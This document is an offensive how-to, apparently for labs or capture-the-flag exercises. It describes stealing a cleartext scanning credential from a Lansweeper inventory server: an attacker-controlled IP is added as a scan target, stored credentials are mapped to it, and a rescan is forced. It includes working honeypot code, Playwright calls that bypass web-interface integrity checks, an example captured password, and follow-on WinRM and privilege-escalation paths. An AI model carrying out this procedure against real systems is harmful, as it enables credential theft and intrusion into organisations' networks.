# Lansweeper Credential Capture via SSH Honeypot

## When this applies

- AD environment with a Lansweeper inventory/asset-management server reachable on its web UI port (default 80/443).
- You have a foothold account that can log into Lansweeper (often a low-priv user — Lansweeper sometimes maps "all domain users" or a generic "Inventory" role onto AD groups).
- Goal: capture the cleartext password of a high-priv scanning credential that Lansweeper periodically dispatches against asset targets.

## The primitive

Lansweeper's "Credentials" admin page stores SSH/WinRM/SNMP/SMB credentials used to remotely inventory assets. Cleartext passwords are encrypted at rest with a Lansweeper-managed key, but **the credential itself is sent in plaintext** to the asset during a scan (SSH password auth, WMI auth, SMB null-session probe). If you can:

1. Add a new IP Range scan target whose IP is an attacker-controlled host on the same network, AND
2. Map a known scanning credential to that range, AND
3. Trigger an immediate rescan,

then a paramiko / Responder / fake-SMB / fake-SNMP listener on the attacker host captures the cleartext password.

## Steps

### 1. Discover the credentials Lansweeper has stored

Navigate (logged-in browser) to **Scanning → Credentials → Map Credentials**. Note the credential names (e.g. `Inventory Linux`, `svc_inventory_lnx`, `Inventory Windows`). The web UI hides the cleartext but you'll see which assets each credential is mapped to. Take note of which OS family each credential supports — Linux creds dispatch to SSH, Windows to WMI/WinRM, SNMP to SNMPv2/v3 query.

### 2. Add an attacker-controlled IP range as a scan target

**Scanning → Scanning Targets → Add new IP Range**:

- Range start/end = attacker VPN tunnel IP (single-host range)
- Optional: override default SSH port to a non-22 value (e.g. 2222) — many lab platforms block player-tunnel TCP/22 inbound

Some Lansweeper builds reject curl-based POSTs to the Add-Target endpoint due to AJAX prefilter token + DOM `focusout`/`chksm` event handlers that compute integrity values only under a real JS engine. **Use Playwright** to drive the dialog — `evaluate("StandardDialog(...)")` directly rather than clicking buttons that key off DOM state.

### 3. Stand up a credential-capturing honeypot

```python
# paramiko SSH honeypot — accepts any password, logs cleartext
import paramiko, threading, socket, sys

class Server(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        print(f"[+] {username}:{password}", flush=True)
        sys.stdout.flush()
        return paramiko.AUTH_SUCCESSFUL          # accept everything
    def get_allowed_auths(self, u): return "password"
    def check_channel_request(self, k, c): return paramiko.OPEN_SUCCEEDED

host_key = paramiko.RSAKey.generate(2048)
sock = socket.socket(); sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", 2222)); sock.listen(100)
print("[*] Listening on :2222")
while True:
    cli, _ = sock.accept()
    t = paramiko.Transport(cli); t.add_server_key(host_key)
    try: t.start_server(server=Server())
    except: pass
```

For Windows / SNMP / SMB credentials, swap the listener:
- **SNMP**: `snmpsim`/`pysnmp` accepting any community
- **SMB**: Responder in analyze mode (capture NetNTLMv2 — useful even when the cred is hash-only on dispatch)
- **WinRM (HTTP)**: simple Flask catching POST + Authorization header

### 4. Map the credential to the attacker range

**Scanning → Credentials → Map Credentials → select your IP Range → assign the credential**. Save.

### 5. Trigger an immediate rescan

Some builds expose `Scanning → Scanning Targets → Rescan now` per target. Others require manual `StandardDialog` invocation:

```javascript
// In Playwright .evaluate() — find the right packageID/href from the page's data-* attrs
StandardDialog('?action=Rescan&type=IPRange&ID=NN', 0, 'Rescan now', 0);
```

The `Deploy now` button on the package list often passes a hard-coded `packageID=-13` placeholder; substitute the real packageID extracted from the row's `data-packageid` attribute.

### 6. Capture and pivot

```
[+] svc_inventory_lnx:0|5m-U6?/uAX
```

The captured cred is the cleartext password Lansweeper had encrypted at rest. Use it for SSH/WinRM/SMB into the asset class it was provisioned for.

## Escalation patterns

| Captured cred type | Typical follow-on |
|---|---|
| Linux SSH (svc_inventory_lnx) | SSH to inventory targets, often a low-priv shell with `sudo -l` enumerable |
| Windows WMI/WinRM (svc_inventory_win) | WinRM as the service account; Lansweeper Admins ⊂ BUILTIN\Remote Management Users on the Lansweeper server itself |
| SNMP RW community | Cisco/network device config download → cleartext device passwords |
| Domain admin (rare, misconfig) | Direct DC access |

The Lansweeper server's `Lansweeper Admins` AD group commonly holds **GenericAll** on its members and is mapped into `BUILTIN\Remote Management Users` — so a captured Lansweeper-Admins-equivalent credential frequently gives WinRM "Pwn3d!" on the inventory server itself, regardless of local-admin status.

## Verifying success

- Honeypot stdout shows the cleartext password.
- `evil-winrm -i <inventory_server> -u <captured_user> -p '<pw>'` connects.
- Lansweeper UI's "Last scanned" timestamp on the attacker IP range advances.

## Common pitfalls

- Default SSH port 22 traffic from the lab into player VPN tunnels is often **blocked**. Override the SSH port on the IP-Range target before mapping the credential — otherwise the scan fails before reaching the honeypot.
- Lansweeper dispatches scans on a schedule (default 4-12 h). "Trigger now" is required to avoid waiting; ensure the right `Rescan` action ID is invoked.
- Final root step (Lansweeper deploy-as-SYSTEM via package push) requires a Windows scanning credential with **admin** on the deploy target. Without that, the deploy primitive is blocked even with Lansweeper-Admins membership.

## Tools

- Playwright (browser automation when AJAX prefilter blocks curl)
- paramiko (SSH honeypot)
- Responder (SMB/HTTP/MSSQL analyze mode)
- snmpsim / pysnmp (SNMP honeypot)
- bloodyAD / bloodhound.py (confirm AD group ACLs after capture)
- evil-winrm (post-capture WinRM session)
